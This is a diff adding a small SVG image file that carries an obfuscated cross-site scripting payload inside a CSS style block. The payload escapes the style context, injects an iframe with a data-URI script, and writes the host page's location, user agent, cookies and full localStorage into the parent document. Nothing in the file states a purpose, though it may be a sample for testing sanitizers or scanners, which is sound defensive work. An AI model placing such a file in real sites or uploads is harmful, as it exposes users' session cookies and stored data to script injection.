@@ -1,0 +1,10 @@
+<?xml version="1.0" standalone="yes"?>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+    <style type="text/css">
+        <![CDATA[
+            s {
+                background : "<textarea></textarea><iframe/srcdoc=&lt;script/src=data:,try{parent.document.write(&#x27;\x3cb\x3eLocation:\x3c/b\x3e&#x27;+parent.location+&#x27;\x3cbr\x3e\x3cb\x3eUserAgent:\x3c/b\x3e&#x27;+navigator.userAgent+&#x27;\x3cbr\x3e\x3cb\x3eCookie:\x3c/b\x3e&#x27;+document.cookie+&#x27;\x3cbr\x3e\x3cb\x3eLocalStorage:\x3c/b\x3e&#x27;+JSON.stringify(localStorage)+&#x27;\x3cbr\x3e&#x27;)}catch(e){parent.document.write(e.message)}&gt;&lt;/script&gt;321></iframe>";
+            }
+        ]]>
+    </style>
+</svg>
